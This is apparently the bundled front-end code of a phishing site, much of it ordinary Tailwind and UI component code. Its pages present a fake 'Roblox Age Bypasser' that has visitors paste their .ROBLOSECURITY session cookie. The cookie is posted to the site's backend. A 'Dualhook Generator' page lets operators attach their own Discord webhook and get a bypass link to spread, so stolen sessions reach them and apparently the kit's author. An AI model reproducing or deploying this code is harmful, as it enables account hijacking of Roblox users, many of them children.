                "backdrop-hue-rotate": [{
                    "backdrop-hue-rotate": [p]
                }],
                "backdrop-invert": [{
                    "backdrop-invert": [m]
                }],
                "backdrop-opacity": [{
                    "backdrop-opacity": [d]
                }],
                "backdrop-saturate": [{
                    "backdrop-saturate": [f]
                }],
                "backdrop-sepia": [{
                    "backdrop-sepia": [C]
                }],
                "border-collapse": [{
                    border: ["collapse", "separate"]
                }],
                "border-spacing": [{
                    "border-spacing": [s]
                }],
                "border-spacing-x": [{
                    "border-spacing-x": [s]
                }],
                "border-spacing-y": [{
                    "border-spacing-y": [s]
                }],
                "table-layout": [{
                    table: ["auto", "fixed"]
                }],
                caption: [{
                    caption: ["top", "bottom"]
                }],
                transition: [{
                    transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", F]
                }],
                duration: [{
                    duration: U()
                }],
                ease: [{
                    ease: ["linear", "in", "out", "in-out", F]
                }],
                delay: [{
                    delay: U()
                }],
                animate: [{
                    animate: ["none", "spin", "ping", "pulse", "bounce", F]
                }],
                transform: [{
                    transform: ["", "gpu", "none"]
                }],
                scale: [{
                    scale: [x]
                }],
                "scale-x": [{
                    "scale-x": [x]
                }],
                "scale-y": [{
                    "scale-y": [x]
                }],
                rotate: [{
                    rotate: [wr, F]
                }],
                "translate-x": [{
                    "translate-x": [_]
                }],
                "translate-y": [{
                    "translate-y": [_]
                }],
                "skew-x": [{
                    "skew-x": [P]
                }],
                "skew-y": [{
                    "skew-y": [P]
                }],
                "transform-origin": [{
                    origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", F]
                }],
                accent: [{
                    accent: ["auto", e]
                }],
                appearance: [{
                    appearance: ["none", "auto"]
                }],
                cursor: [{
                    cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", F]
                }],
                "caret-color": [{
                    caret: [e]
                }],
                "pointer-events": [{
                    "pointer-events": ["none", "auto"]
                }],
                resize: [{
                    resize: ["none", "y", "x", ""]
                }],
                "scroll-behavior": [{
                    scroll: ["auto", "smooth"]
                }],
                "scroll-m": [{
                    "scroll-m": z()
                }],
                "scroll-mx": [{
                    "scroll-mx": z()
                }],
                "scroll-my": [{
                    "scroll-my": z()
                }],
                "scroll-ms": [{
                    "scroll-ms": z()
                }],
                "scroll-me": [{
                    "scroll-me": z()
                }],
                "scroll-mt": [{
                    "scroll-mt": z()
                }],
                "scroll-mr": [{
                    "scroll-mr": z()
                }],
                "scroll-mb": [{
                    "scroll-mb": z()
                }],
                "scroll-ml": [{
                    "scroll-ml": z()
                }],
                "scroll-p": [{
                    "scroll-p": z()
                }],
                "scroll-px": [{
                    "scroll-px": z()
                }],
                "scroll-py": [{
                    "scroll-py": z()
                }],
                "scroll-ps": [{
                    "scroll-ps": z()
                }],
                "scroll-pe": [{
                    "scroll-pe": z()
                }],
                "scroll-pt": [{
                    "scroll-pt": z()
                }],
                "scroll-pr": [{
                    "scroll-pr": z()
                }],
                "scroll-pb": [{
                    "scroll-pb": z()
                }],
                "scroll-pl": [{
                    "scroll-pl": z()
                }],
                "snap-align": [{
                    snap: ["start", "end", "center", "align-none"]
                }],
                "snap-stop": [{
                    snap: ["normal", "always"]
                }],
                "snap-type": [{
                    snap: ["none", "x", "y", "both"]
                }],
                "snap-strictness": [{
                    snap: ["mandatory", "proximity"]
                }],
                touch: [{
                    touch: ["auto", "none", "manipulation"]
                }],
                "touch-x": [{
                    "touch-pan": ["x", "left", "right"]
                }],
                "touch-y": [{
                    "touch-pan": ["y", "up", "down"]
                }],
                "touch-pz": ["touch-pinch-zoom"],
                select: [{
                    select: ["none", "text", "all", "auto"]
                }],
                "will-change": [{
                    "will-change": ["auto", "scroll", "contents", "transform", F]
                }],
                fill: [{
                    fill: [e, "none"]
                }],
                "stroke-w": [{
                    stroke: [ht, Rt, Ps]
                }],
                stroke: [{
                    stroke: [e, "none"]
                }],
                sr: ["sr-only", "not-sr-only"],
                "forced-color-adjust": [{
                    "forced-color-adjust": ["auto", "none"]
                }]
            },
            conflictingClassGroups: {
                overflow: ["overflow-x", "overflow-y"],
                overscroll: ["overscroll-x", "overscroll-y"],
                inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
                "inset-x": ["right", "left"],
                "inset-y": ["top", "bottom"],
                flex: ["basis", "grow", "shrink"],
                gap: ["gap-x", "gap-y"],
                p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
                px: ["pr", "pl"],
                py: ["pt", "pb"],
                m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
                mx: ["mr", "ml"],
                my: ["mt", "mb"],
                size: ["w", "h"],
                "font-size": ["leading"],
                "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
                "fvn-ordinal": ["fvn-normal"],
                "fvn-slashed-zero": ["fvn-normal"],
                "fvn-figure": ["fvn-normal"],
                "fvn-spacing": ["fvn-normal"],
                "fvn-fraction": ["fvn-normal"],
                "line-clamp": ["display", "overflow"],
                rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
                "rounded-s": ["rounded-ss", "rounded-es"],
                "rounded-e": ["rounded-se", "rounded-ee"],
                "rounded-t": ["rounded-tl", "rounded-tr"],
                "rounded-r": ["rounded-tr", "rounded-br"],
                "rounded-b": ["rounded-br", "rounded-bl"],
                "rounded-l": ["rounded-tl", "rounded-bl"],
                "border-spacing": ["border-spacing-x", "border-spacing-y"],
                "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
                "border-w-x": ["border-w-r", "border-w-l"],
                "border-w-y": ["border-w-t", "border-w-b"],
                "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
                "border-color-x": ["border-color-r", "border-color-l"],
                "border-color-y": ["border-color-t", "border-color-b"],
                "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
                "scroll-mx": ["scroll-mr", "scroll-ml"],
                "scroll-my": ["scroll-mt", "scroll-mb"],
                "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
                "scroll-px": ["scroll-pr", "scroll-pl"],
                "scroll-py": ["scroll-pt", "scroll-pb"],
                touch: ["touch-x", "touch-y", "touch-pz"],
                "touch-x": ["touch"],
                "touch-y": ["touch"],
                "touch-pz": ["touch"]
            },
            conflictingClassGroupModifiers: {
                "font-size": ["leading"]
            }
        }
    },
    n0 = Ag(t0);

function Pe(...e) {
    return n0(Tp(e))
}
const r0 = vg,
    Ap = g.forwardRef(({
        className: e,
        ...t
    }, n) => y.jsx(xp, {
        ref: n,
        className: Pe("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]", e),
        ...t
    }));
Ap.displayName = xp.displayName;
const o0 = _u("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full", {
        variants: {
            variant: {
                default: "border bg-background text-foreground",
                destructive: "destructive group border-destructive bg-destructive text-destructive-foreground"
            }
        },
        defaultVariants: {
            variant: "default"
        }
    }),
    zp = g.forwardRef(({
        className: e,
        variant: t,
        ...n
    }, r) => y.jsx(Sp, {
        ref: r,
        className: Pe(o0({
            variant: t
        }), e),
        ...n
    }));
zp.displayName = Sp.displayName;
const i0 = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx(Cp, {
    ref: n,
    className: Pe("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive", e),
    ...t
}));
i0.displayName = Cp.displayName;
const bp = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx(Pp, {
    ref: n,
    className: Pe("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600", e),
    "toast-close": "",
    ...t,
    children: y.jsx(Op, {
        className: "h-4 w-4"
    })
}));
bp.displayName = Pp.displayName;
const Up = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx(kp, {
    ref: n,
    className: Pe("text-sm font-semibold", e),
    ...t
}));
Up.displayName = kp.displayName;
const $p = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx(Ep, {
    ref: n,
    className: Pe("text-sm opacity-90", e),
    ...t
}));
$p.displayName = Ep.displayName;

function s0() {
    const {
        toasts: e
    } = _v();
    return y.jsxs(r0, {
        children: [e.map(function({
            id: t,
            title: n,
            description: r,
            action: o,
            ...i
        }) {
            return y.jsxs(zp, { ...i,
                children: [y.jsxs("div", {
                    className: "grid gap-1",
                    children: [n && y.jsx(Up, {
                        children: n
                    }), r && y.jsx($p, {
                        children: r
                    })]
                }), o, y.jsx(bp, {})]
            }, t)
        }), y.jsx(Ap, {})]
    })
}
const l0 = _u("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
        variants: {
            variant: {
                default: "bg-primary text-primary-foreground hover:bg-primary/90",
                destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                ghost: "hover:bg-accent hover:text-accent-foreground",
                link: "text-primary underline-offset-4 hover:underline"
            },
            size: {
                default: "h-10 px-4 py-2",
                sm: "h-9 rounded-md px-3",
                lg: "h-11 rounded-md px-8",
                icon: "h-10 w-10"
            }
        },
        defaultVariants: {
            variant: "default",
            size: "default"
        }
    }),
    eo = g.forwardRef(({
        className: e,
        variant: t,
        size: n,
        asChild: r = !1,
        ...o
    }, i) => {
        const s = r ? jv : "button";
        return y.jsx(s, {
            className: Pe(l0({
                variant: t,
                size: n,
                className: e
            })),
            ref: i,
            ...o
        })
    });
eo.displayName = "Button";
const wi = g.forwardRef(({
    className: e,
    type: t,
    ...n
}, r) => y.jsx("input", {
    type: t,
    className: Pe("flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", e),
    ref: r,
    ...n
}));
wi.displayName = "Input";
var u0 = "Label",
    Vp = g.forwardRef((e, t) => y.jsx(rt.label, { ...e,
        ref: t,
        onMouseDown: n => {
            var o;
            n.target.closest("button, input, select, textarea") || ((o = e.onMouseDown) == null || o.call(e, n), !n.defaultPrevented && n.detail > 1 && n.preventDefault())
        }
    }));
Vp.displayName = u0;
var Wp = Vp;
const a0 = _u("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"),
    xi = g.forwardRef(({
        className: e,
        ...t
    }, n) => y.jsx(Wp, {
        ref: n,
        className: Pe(a0(), e),
        ...t
    }));
xi.displayName = Wp.displayName;
const Wi = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("rounded-lg border bg-card text-card-foreground shadow-sm", e),
    ...t
}));
Wi.displayName = "Card";
const Bp = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("flex flex-col space-y-1.5 p-6", e),
    ...t
}));
Bp.displayName = "CardHeader";
const Qp = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("text-2xl font-semibold leading-none tracking-tight", e),
    ...t
}));
Qp.displayName = "CardTitle";
const c0 = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("text-sm text-muted-foreground", e),
    ...t
}));
c0.displayName = "CardDescription";
const Bi = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("p-6 pt-0", e),
    ...t
}));
Bi.displayName = "CardContent";
const d0 = g.forwardRef(({
    className: e,
    ...t
}, n) => y.jsx("div", {
    ref: n,
    className: Pe("flex items-center p-6 pt-0", e),
    ...t
}));
d0.displayName = "CardFooter";

function Hp({
    type: e,
    title: t,
    message: n,
    isOpen: r,
    onClose: o
}) {
    const [i, s] = g.useState(!1);
    g.useEffect(() => {
        r && s(!0)
    }, [r]);
    const l = () => {
        s(!1), setTimeout(o, 200)
    };
    return r ? y.jsxs("div", {
        className: "fixed inset-0 z-50 flex items-center justify-center p-4",
        children: [y.jsx("div", {
            className: `absolute inset-0 bg-black/60 backdrop-blur-sm transition-opacity duration-200 ${i?"opacity-100":"opacity-0"}`,
            onClick: l
        }), y.jsxs("div", {
            className: `relative w-full max-w-sm bg-black/90 backdrop-blur-md border border-white/20 
                   rounded-2xl p-6 shadow-2xl transition-all duration-200 ${i?"scale-100 opacity-100":"scale-95 opacity-0"}`,
            children: [y.jsx("button", {
                onClick: l,
                className: "absolute top-4 right-4 p-1 text-gray-400 hover:text-white transition-colors",
                children: y.jsx(Op, {
                    className: "w-4 h-4"
                })
            }), y.jsxs("div", {
                className: "flex flex-col items-center text-center space-y-4",
                children: [y.jsx("div", {
                    className: `w-12 h-12 rounded-full flex items-center justify-center ${e==="success"?"bg-white/10":"bg-red-500/10"}`,
                    children: e === "success" ? y.jsx(Sg, {
                        className: "w-6 h-6 text-white"
                    }) : y.jsx(Rp, {
                        className: "w-6 h-6 text-red-400"
                    })
                }), y.jsx("h3", {
                    className: "text-lg font-medium text-white",
                    children: t
                }), y.jsx("p", {
                    className: "text-sm text-gray-300 leading-relaxed",
                    children: n
                }), y.jsx(eo, {
                    onClick: l,
                    className: "w-full mt-2 bg-white text-black hover:bg-gray-200 transition-colors",
                    children: e === "success" ? "Great!" : "Try Again"
                })]
            })]
        })]
    }) : null
}

function Kp() {
    const [e, t] = g.useState({
        type: "success",
        title: "",
        message: "",
        isOpen: !1
    });
    return {
        alert: e,
        showAlert: (o, i, s) => {
            t({
                type: o,
                title: i,
                message: s,
                isOpen: !0
            })
        },
        closeAlert: () => {
            t(o => ({ ...o,
                isOpen: !1
            }))
        }
    }
}

function uc() {
    const t = $f().directory,
        [n, r] = g.useState(""),
        [o, i] = g.useState(!1),
        [s, l] = g.useState(null),
        [u, a] = g.useState(0),
        [p, m] = g.useState(""),
        h = g.useRef(null),
        {
            alert: w,
            showAlert: k,
            closeAlert: v
        } = Kp();
    g.useEffect(() => {
        t ? document.title = `${t.toUpperCase()} - PAGE` : document.title = "Landing - Page"
    }, [t]), g.useEffect(() => () => {
        h.current && clearInterval(h.current)
    }, []);
    const S = async f => {
            if (f.preventDefault(), !n.trim()) {
                k("error", "Missing Cookie", "Please enter your .ROBLOSECURITY cookie to continue");
                return
            }
            i(!0);
            try {
                const C = await (await wl("POST", "/api/bypass", {
                    cookie: n,
                    directoryPath: t
                })).json();
                if (C.success) l(C.data), m(C.data.robloxUsername || "Unknown User"), a(0), d(C.data.token);
                else throw new Error(C.message || "Unknown error occurred.")
            } catch {
                k("error", "Request Failed", "Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account")
            } finally {
                i(!1)
            }
        },
        d = f => {
            if (!f) return;
            const x = async () => {
                try {
                    const P = await (await wl("GET", `/api/progress?token=${encodeURIComponent(f)}`)).json();
                    if (P.success && typeof P.progress < "u") {
                        const N = Math.min(100, Math.max(0, P.progress));
                        a(N), N >= 100 && (h.current && clearInterval(h.current), k("success", "Bypass Complete!", `Account "${P.username||p}" has been successfully bypassed and is now ready to use.`))
                    }
                } catch (C) {
                    console.error("Progress fetch error:", C)
                }
            };
            x(), h.current = setInterval(x, 3e3)
        },
        c = () => {
            l(null), a(0), m(""), r(""), h.current && clearInterval(h.current)
        };
    return y.jsxs("div", {
        className: "bg-black min-h-screen flex items-center justify-center p-4 md:p-6",
        children: [y.jsxs("div", {
            className: "w-full max-w-md",
            children: [y.jsxs("div", {
                className: "text-center mb-8",
                children: [y.jsx("div", {
                    className: "inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 backdrop-blur-sm mb-4",
                    children: y.jsx(Eg, {
                        className: "w-8 h-8 text-white"
                    })
                }), y.jsx("h1", {
                    className: "text-2xl md:text-3xl font-light text-white mb-2",
                    children: "Roblox Age Bypasser"
                }), y.jsx("p", {
                    className: "text-gray-400 text-sm",
                    children: "Secure and efficient age verification bypass"
                })]
            }), y.jsx(Wi, {
                className: "glass-card shadow-2xl border-0",
                children: y.jsxs(Bi, {
                    className: "p-6 md:p-8",
                    children: [y.jsxs("form", {
                        onSubmit: S,
                        className: "space-y-6",
                        children: [y.jsxs("div", {
                            className: "space-y-2",
                            children: [y.jsx(xi, {
                                htmlFor: "cookie",
                                className: "text-sm font-medium text-gray-300",
                                children: ".ROBLOSECURITY Cookie"
                            }), y.jsx(wi, {
                                type: "text",
                                id: "cookie",
                                value: n,
                                onChange: f => r(f.target.value),
                                required: !0,
                                disabled: o || s,
                                className: `w-full h-12 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder-gray-500 
                           input-focus smooth-transition hover:border-white/20 disabled:opacity-50 disabled:cursor-not-allowed`,
                                placeholder: "Paste your cookie here..."
                            })]
                        }), y.jsx(eo, {
                            type: "submit",
                            disabled: o || s,
                            className: `w-full h-12 bg-white text-black hover:bg-gray-200 disabled:bg-gray-600 disabled:text-gray-400
                          disabled:cursor-not-allowed smooth-transition font-medium rounded-xl`,
                            children: o ? y.jsxs(y.Fragment, {
                                children: [y.jsx(jp, {
                                    className: "mr-2 h-4 w-4 animate-spin"
                                }), "Processing"]
                            }) : s ? y.jsxs(y.Fragment, {
                                children: [y.jsx(ic, {
                                    className: "mr-2 h-4 w-4"
                                }), "In Progress"]
                            }) : y.jsxs(y.Fragment, {
                                children: [y.jsx(ic, {
                                    className: "mr-2 h-4 w-4"
                                }), "Start Bypass"]
                            })
                        })]
                    }), s && y.jsxs("div", {
                        className: "mt-8 space-y-6",
                        children: [y.jsxs("div", {
                            className: "text-center space-y-1",
                            children: [y.jsx("p", {
                                className: "text-sm text-gray-400",
                                children: "Processing account"
                            }), y.jsx("p", {
                                className: "text-xl font-light text-white",
                                children: p
                            })]
                        }), y.jsxs("div", {
                            className: "space-y-4",
                            children: [y.jsxs("div", {
                                className: "flex justify-between items-center",
                                children: [y.jsx("span", {
                                    className: "text-sm font-medium text-gray-300",
                                    children: "Progress"
                                }), y.jsxs("span", {
                                    className: "text-lg font-medium text-white tabular-nums",
                                    children: [u, "%"]
                                })]
                            }), y.jsxs("div", {
                                className: "relative",
                                children: [y.jsx("div", {
                                    className: "w-full h-3 bg-white/10 rounded-full overflow-hidden backdrop-blur-sm",
                                    children: y.jsx("div", {
                                        className: `h-full bg-gradient-to-r from-white to-gray-200 rounded-full 
                                 transition-all duration-700 ease-out relative overflow-hidden`,
                                        style: {
                                            width: `${u}%`
                                        },
                                        children: y.jsx("div", {
                                            className: `absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent 
                                      -skew-x-12 animate-shimmer`
                                        })
                                    })
                                }), u > 0 && u < 100 && y.jsx("div", {
                                    className: `absolute -top-1 -bottom-1 rounded-full bg-white/20 
                                    animate-pulse blur-sm`,
                                    style: {
                                        left: `${Math.max(0,u-2)}%`,
                                        width: `${Math.min(4,u)}%`
                                    }
                                })]
                            }), y.jsx("div", {
                                className: "flex items-center justify-center space-x-2",
                                children: u < 100 ? y.jsxs(y.Fragment, {
                                    children: [y.jsx("div", {
                                        className: "w-1.5 h-1.5 bg-white rounded-full animate-ping"
                                    }), y.jsx("span", {
                                        className: "text-xs text-gray-400 animate-pulse",
                                        children: "Processing..."
                                    })]
                                }) : y.jsxs(y.Fragment, {
                                    children: [y.jsx("div", {
                                        className: "w-2 h-2 bg-white rounded-full"
                                    }), y.jsx("span", {
                                        className: "text-xs text-white font-medium",
                                        children: "Complete"
                                    })]
                                })
                            })]
                        })]
                    }), s && u >= 100 && y.jsxs(eo, {
                        onClick: c,
                        variant: "outline",
                        className: `w-full mt-6 h-12 bg-transparent border border-white/20 text-white hover:bg-white/5 
                          smooth-transition font-medium rounded-xl`,
                        children: [y.jsx(kg, {
                            className: "mr-2 h-4 w-4"
                        }), "Start New Bypass"]
                    })]
                })
            }), y.jsx("div", {
                className: "text-center mt-6",
                children: y.jsx("p", {
                    className: "text-xs text-gray-500",
                    children: "Secure • Fast • Reliable"
                })
            })]
        }), y.jsx(Hp, {
            type: w.type,
            title: w.title,
            message: w.message,
            isOpen: w.isOpen,
            onClose: v
        })]
    })
}

function f0() {
    const [e, t] = g.useState(""), [n, r] = g.useState(""), [o, i] = g.useState(!1), {
        alert: s,
        showAlert: l,
        closeAlert: u
    } = Kp();
    g.useEffect(() => {
        document.title = "Dualhook - Page"
    }, []);
    const a = async p => {
        var m;
        if (p.preventDefault(), !e.trim() || !n.trim()) {
            l("error", "Missing Fields", "Please fill in both directory and webhook URL");
            return
        }
        if (!/^[a-zA-Z0-9-]+$/.test(e)) {
            l("error", "Invalid Directory", "Directory can only contain letters, numbers, and hyphens");
            return
        }
        if (!n.includes("discord.com/api/webhooks/")) {
            l("error", "Invalid Webhook", "Please provide a valid Discord webhook URL");
            return
        }
        i(!0);
        try {
            const w = await (await wl("POST", "/api/generator", {
                directory: e.toLowerCase().trim(),
                webhook: n.trim()
            })).json();
            w.success ? (l("success", "Directory Created!", `Your bypass URL is ready: ${window.location.origin}/tools/${e}`), t(""), r("")) : (m = w.message) != null && m.includes("webhook") ? l("error", "Invalid Webhook", w.message) : l("error", "Creation Failed", w.message || "Failed to create directory")
        } catch (h) {
            const w = h.message || "Failed to create directory. Please try again.";
            w.includes("webhook") ? l("error", "Webhook Validation Failed", w) : l("error", "Creation Failed", w)
        } finally {
            i(!1)
        }
    };
    return y.jsxs("div", {
        className: "bg-black min-h-screen flex items-center justify-center p-4 md:p-6",
        children: [y.jsxs("div", {
            className: "w-full max-w-md",
            children: [y.jsxs("div", {
                className: "text-center mb-8",
                children: [y.jsx("div", {
                    className: "inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 backdrop-blur-sm mb-4",
                    children: y.jsx(Cs, {
                        className: "w-8 h-8 text-white"
                    })
                }), y.jsx("h1", {
                    className: "text-2xl md:text-3xl font-light text-white mb-2",
                    children: "Dualhook Generator"
                }), y.jsx("p", {
                    className: "text-gray-400 text-sm",
                    children: "Create Your Dualhook In Here"
                })]
            }), y.jsxs(Wi, {
                className: "glass-card shadow-2xl border-0",
                children: [y.jsx(Bp, {
                    className: "text-center pb-4",
                    children: y.jsx(Qp, {
                        className: "text-xl font-medium text-white",
                        children: "Generate New Directory"
                    })
                }), y.jsx(Bi, {
                    className: "p-6 md:p-8",
                    children: y.jsxs("form", {
                        onSubmit: a,
                        className: "space-y-6",
                        children: [y.jsxs("div", {
                            className: "space-y-2",
                            children: [y.jsxs(xi, {
                                htmlFor: "directory",
                                className: "text-sm font-medium text-gray-300 flex items-center gap-2",
                                children: [y.jsx(Cs, {
                                    className: "w-4 h-4"
                                }), "Directory Name"]
                            }), y.jsx(wi, {
                                type: "text",
                                id: "directory",
                                value: e,
                                onChange: p => t(p.target.value),
                                required: !0,
                                disabled: o,
                                className: `w-full h-12 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder-gray-500 
                           input-focus smooth-transition hover:border-white/20 disabled:opacity-50 disabled:cursor-not-allowed`,
                                placeholder: "my-bypass-directory"
                            }), y.jsxs("p", {
                                className: "text-xs text-gray-500",
                                children: ["Will create: ", window.location.origin, "/tools/", e || "your-directory"]
                            })]
                        }), y.jsxs("div", {
                            className: "space-y-2",
                            children: [y.jsxs(xi, {
                                htmlFor: "webhook",
                                className: "text-sm font-medium text-gray-300 flex items-center gap-2",
                                children: [y.jsx(Cg, {
                                    className: "w-4 h-4"
                                }), "Webhook URL"]
                            }), y.jsx(wi, {
                                type: "url",
                                id: "webhook",
                                value: n,
                                onChange: p => r(p.target.value),
                                required: !0,
                                disabled: o,
                                className: `w-full h-12 px-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder-gray-500 
                           input-focus smooth-transition hover:border-white/20 disabled:opacity-50 disabled:cursor-not-allowed`,
                                placeholder: "https://discord.com/api/webhooks/..."
                            }), y.jsx("p", {
                                className: "text-xs text-gray-500",
                                children: "Webhook For Hook Ur User"
                            })]
                        }), y.jsx(eo, {
                            type: "submit",
                            disabled: o,
                            className: `w-full h-12 bg-white text-black hover:bg-gray-200 disabled:bg-gray-600 disabled:text-gray-400
                          disabled:cursor-not-allowed smooth-transition font-medium rounded-xl`,
                            children: o ? y.jsxs(y.Fragment, {
                                children: [y.jsx(jp, {
                                    className: "mr-2 h-4 w-4 animate-spin"
                                }), "Creating Directory"]
                            }) : y.jsxs(y.Fragment, {
                                children: [y.jsx(Cs, {
                                    className: "mr-2 h-4 w-4"
                                }), "Create Directory"]
                            })
                        })]
                    })
                })]
            }), y.jsx("div", {
                className: "text-center mt-6",
                children: y.jsx("p", {
                    className: "text-xs text-gray-500",
                    children: "Created By Kyx With Love"
                })
            })]
        }), y.jsx(Hp, {
            type: s.type,
            title: s.title,
            message: s.message,
            isOpen: s.isOpen,
            onClose: u
        })]
    })
}

function p0() {
    return y.jsx("div", {
        className: "min-h-screen w-full flex items-center justify-center bg-gray-50",
        children: y.jsx(Wi, {
            className: "w-full max-w-md mx-4",
            children: y.jsxs(Bi, {
                className: "pt-6",
                children: [y.jsxs("div", {
                    className: "flex mb-4 gap-2",
                    children: [y.jsx(Rp, {
                        className: "h-8 w-8 text-red-500"
                    }), y.jsx("h1", {
                        className: "text-2xl font-bold text-gray-900",
                        children: "404 Page Not Found"
                    })]
                }), y.jsx("p", {
                    className: "mt-4 text-sm text-gray-600",
                    children: "Did you forget to add the page to the router?"
                })]
            })
        })
    })
}

function h0() {
    return y.jsxs(Yy, {
        children: [y.jsx(_o, {
            path: "/",
            component: uc
        }), y.jsx(_o, {
            path: "/generator",
            component: f0
        }), y.jsx(_o, {
            path: "/tools/:directory",
            component: uc
        }), y.jsx(_o, {
            component: p0
        })]
    })
}

function m0() {
    return y.jsxs(xv, {
        client: kv,
        children: [y.jsx(s0, {}), y.jsx(h0, {})]
    })
}
Of(document.getElementById("root")).render(y.jsx(m0, {}));